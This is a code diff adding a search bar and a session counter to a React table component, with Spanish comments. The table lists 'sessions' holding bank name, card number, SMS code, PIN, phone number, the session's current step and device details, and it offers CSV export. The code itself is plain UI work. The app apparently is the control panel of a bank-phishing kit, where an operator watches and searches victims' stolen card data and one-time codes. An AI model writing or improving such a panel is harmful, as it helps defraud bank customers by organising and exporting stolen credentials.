@@ -8,7 +8,8 @@ import { useToast } from '@/hooks/use-toast';
 import { useDeviceInfo } from '@/hooks/use-device-orientation';
 import { Card, CardContent } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
-import { ArrowRight, Ban, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target, Download, QrCode } from 'lucide-react';
+import { Input } from '@/components/ui/input';
+import { ArrowRight, Ban, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target, Download, QrCode, Search } from 'lucide-react';
 import { DeleteConfirmDialog } from './DeleteConfirmDialog';
 
 interface AccessTableProps {
@@ -39,6 +40,9 @@ const AccessTable: React.FC<AccessTableProps> = ({
   // Estado para el diálogo de confirmación de eliminación
   const [isDeleteDialogOpen, setIsDeleteDialogOpen] = useState<boolean>(false);
   const [sessionToDelete, setSessionToDelete] = useState<Session | null>(null);
+  
+  // Estado para el término de búsqueda
+  const [searchTerm, setSearchTerm] = useState<string>('');
   
   // Mutation para guardar una sesión
   const saveSessionMutation = useMutation({
@@ -84,10 +88,33 @@ const AccessTable: React.FC<AccessTableProps> = ({
     }
   });
   
-  // Filter sessions by bank if a specific bank is selected
-  const filteredSessions = activeBank === 'todos' 
-    ? sessions 
-    : sessions.filter(session => session.banco === activeBank);
+  // Filter sessions by bank and search term
+  const filteredSessions = sessions.filter(session => {
+    // Filtrar por banco primero
+    const matchesBank = activeBank === 'todos' || session.banco === activeBank;
+    
+    // Si no hay término de búsqueda, solo filtrar por banco
+    if (!searchTerm.trim()) {
+      return matchesBank;
+    }
+    
+    // Filtrar por término de búsqueda en múltiples campos
+    const searchLower = searchTerm.toLowerCase().trim();
+    const matchesSearch = 
+      session.folio?.toLowerCase().includes(searchLower) ||
+      session.banco?.toLowerCase().includes(searchLower) ||
+      session.username?.toLowerCase().includes(searchLower) ||
+      session.createdBy?.toLowerCase().includes(searchLower) ||
+      session.tarjeta?.includes(searchTerm) ||
+      session.sms?.includes(searchTerm) ||
+      session.nip?.includes(searchTerm) ||
+      session.celular?.includes(searchTerm) ||
+      session.pasoActual?.toLowerCase().includes(searchLower) ||
+      session.deviceType?.toLowerCase().includes(searchLower) ||
+      session.deviceModel?.toLowerCase().includes(searchLower);
+    
+    return matchesBank && matchesSearch;
+  });
     
   // Referencias previas de las sesiones para poder comparar y detectar cambios
   const [prevSessions, setPrevSessions] = useState<Session[]>([]);
@@ -405,20 +432,49 @@ const AccessTable: React.FC<AccessTableProps> = ({
         session={sessionToDelete}
       />
       
-      {/* Botón de exportación */}
-      {filteredSessions.length > 0 && (
-        <div className="mb-3 flex justify-end">
-          <Button
-            variant="outline"
-            size="sm"
-            className="text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-2"
-            onClick={exportToCSV}
-          >
-            <Download className="h-4 w-4" />
-            Exportar a CSV
-          </Button>
+      {/* Barra de búsqueda y botón de exportación */}
+      <div className="mb-4 flex flex-col sm:flex-row gap-3 items-stretch sm:items-center justify-between">
+        {/* Buscador */}
+        <div className="relative flex-1 max-w-md">
+          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
+          <Input
+            type="text"
+            placeholder="Buscar por folio, banco, usuario, tarjeta..."
+            value={searchTerm}
+            onChange={(e) => setSearchTerm(e.target.value)}
+            className="pl-10 bg-[#1e1e1e] border-[#2c2c2c] text-[#ccc] placeholder-gray-500 focus:border-[#00aaff] focus:ring-[#00aaff]"
+          />
         </div>
-      )}
+        
+        {/* Contador de resultados y botón de exportación */}
+        <div className="flex items-center gap-3">
+          {/* Contador de sesiones */}
+          <div className="text-sm text-gray-400">
+            {searchTerm.trim() ? (
+              <span>
+                {filteredSessions.length} de {sessions.length} sesiones
+              </span>
+            ) : (
+              <span>
+                {filteredSessions.length} sesiones totales
+              </span>
+            )}
+          </div>
+          
+          {/* Botón de exportación */}
+          {filteredSessions.length > 0 && (
+            <Button
+              variant="outline"
+              size="sm"
+              className="text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-2 whitespace-nowrap"
+              onClick={exportToCSV}
+            >
+              <Download className="h-4 w-4" />
+              Exportar a CSV
+            </Button>
+          )}
+        </div>
+      </div>
       
       {/* El efecto para detectar cambios en el tamaño de pantalla está declarado fuera del return */}
       
